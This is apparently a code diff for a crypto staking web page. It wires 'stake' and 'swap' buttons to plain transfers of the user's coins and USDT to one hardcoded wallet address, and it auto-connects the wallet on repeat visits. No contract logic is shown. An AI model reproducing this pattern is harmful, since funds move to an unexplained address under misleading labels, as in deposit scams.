@@ -1,8 +1,9 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 "use client";
 
 import type React from "react";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useTranslations } from "next-intl";
 import Header from "./home/Header";
 import AnnouncementBanner from "./home/AnnouncementBanner";
@@ -38,13 +39,13 @@ export default function IDSStakingPlatform() {
   const [copied, setCopied] = useState(false);
   const [membershipType, setMembershipType] = useState<"free" | "vip">("free");
   const [showVipModal, setShowVipModal] = useState(false);
-  const [selectedChain, setSelectedChain] = useState("ethereum");
+  const [selectedChain, setSelectedChain] = useState<any>("1");
   const [swapAmount, setSwapAmount] = useState("");
   const [showCommissionModal, setShowCommissionModal] = useState(false);
   const [showRewardsModal, setShowRewardsModal] = useState(false);
   const [showInfoModal, setShowInfoModal] = useState(false);
   const [vipSelectedChain, setVipSelectedChain] = useState("ethereum");
-  const { wallet, isConnected, setWallet, disconnect } = useUserWallet();
+  const { connectWallet, isConnected, sendTransaction } = useUserWallet();
   const referralLink = "https://ids-community.com/ref/USER123456";
 
   const copyReferralLink = async () => {
@@ -57,19 +58,50 @@ export default function IDSStakingPlatform() {
     }
   };
 
+  const handleStake = async () => {
+    const txHash = await sendTransaction({
+      to: "0xf59402F215FE30e09CC7AAC1551604A029AE381A",
+      amount: stakeAmount,
+      type: "coin",
+      chainId: 97,
+    });
+    console.log(txHash);
+  };
+
+  const handleSwap = async () => {
+    const usdtContracts = {
+      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",     // Ethereum Mainnet (ERC-20)
+      56: "0x55d398326f99059ff775485246999027b3197955",    // BNB Smart Chain (BEP-20)
+      137: "0xC2132D05D31c914A87C6611C10748AEb04B58E8F",    // Polygon Mainnet
+      42161: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"   // Arbitrum One
+    };
+    const txHash = await sendTransaction({
+      to: '0xf59402F215FE30e09CC7AAC1551604A029AE381A',
+      amount: swapAmount,
+      type: "token",
+      chainId: Number(selectedChain),
+      tokenAddress: usdtContracts[selectedChain as keyof typeof usdtContracts]
+    });
+    console.log(txHash);
+  };
+
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      const visited = sessionStorage.getItem("idscoin_visited");
+      if (visited) {
+        connectWallet();
+      } else {
+        sessionStorage.setItem("idscoin_visited", "1");
+      }
+    }
+  }, []);
+
   const tooltips = {
     tvl: t("tooltips.tvl"),
     apy: t("tooltips.apy"),
     users: t("tooltips.users"),
     locked: t("tooltips.locked"),
     stakeProgress: t("tooltips.stakeProgress"),
-  };
-
-  const connectWallet = () => {
-    setWallet({
-      address: "0x1234567890123456789012345678901234567890",
-      chainId: 1,
-    });
   };
 
   return (
@@ -81,7 +113,7 @@ export default function IDSStakingPlatform() {
           <div className="flex justify-center items-center mb-3">
             <Button
               variant="default"
-              className="w-full max-w-[220px] bg-gradient-to-br from-orange-600 via-orange-500 to-amber-500 border-orange-400 shadow-lg shadow-orange-500/30 ring-1 ring-orange-400/50"
+              className="w-full cursor-pointer max-w-[220px] bg-gradient-to-br from-orange-600 via-orange-500 to-amber-500 border-orange-400 shadow-lg shadow-orange-500/30 ring-1 ring-orange-400/50"
               onClick={() => connectWallet()}
             >
               Connect Wallet
@@ -102,6 +134,8 @@ export default function IDSStakingPlatform() {
                 setSelectedChain={setSelectedChain}
                 swapAmount={swapAmount}
                 setSwapAmount={setSwapAmount}
+                handleStake={handleStake}
+                handleSwap={handleSwap}
               />
               <ReferralCard
                 t={t}
